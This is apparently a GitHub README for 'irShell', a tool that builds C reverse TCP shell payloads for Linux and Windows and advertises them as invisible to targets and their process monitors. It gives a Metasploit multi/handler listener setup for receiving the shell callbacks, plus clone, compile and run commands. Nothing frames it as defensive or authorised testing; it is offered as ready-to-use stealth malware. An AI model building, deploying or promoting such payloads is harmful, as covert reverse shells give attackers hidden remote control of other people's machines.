# irShell
💯% Invisible Reverse TCP Shell Payloads for Linux/Windows in C. 

## About:
A simple C script that creates and compiles C payloads for reverse tcp shells that are 100% invisible not only to the target but the target's resource/process monitors. Simple MSFconsole handlers/listeners are then used for callbacks.

## MSFconsole:

```
set exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run
```

## Requirements:

SHC 

```
sudo apt install -y shc
```

Bash

```
sudo apt install -y bash
```
GCC

```
sudo apt install -y gcc
```




## Installation:

```
git clone https://github.com/MBHudson/irShell.git && cd irShell && sudo gcc irShell.c -o irShell && chmod +x irShell
```

## Usage:

```
sudo ./irShell
```
